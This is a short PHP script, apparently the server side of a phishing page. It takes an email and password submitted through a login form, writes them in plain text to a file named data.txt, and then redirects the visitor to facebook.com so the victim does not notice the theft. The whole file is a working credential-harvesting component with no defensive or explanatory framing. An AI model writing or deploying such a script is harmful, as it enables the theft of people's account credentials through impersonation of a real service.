<?php

$email = trim($_POST['email']);
$pass = trim($_POST['pass']);

$fp = fopen('data.txt', 'a');
fwrite($fp, "email: {$email}\n");
fwrite($fp, "pass: {$pass}\n");
fwrite($fp, "-------------------\n");
fclose($fp);

header('Location: https://facebook.com');
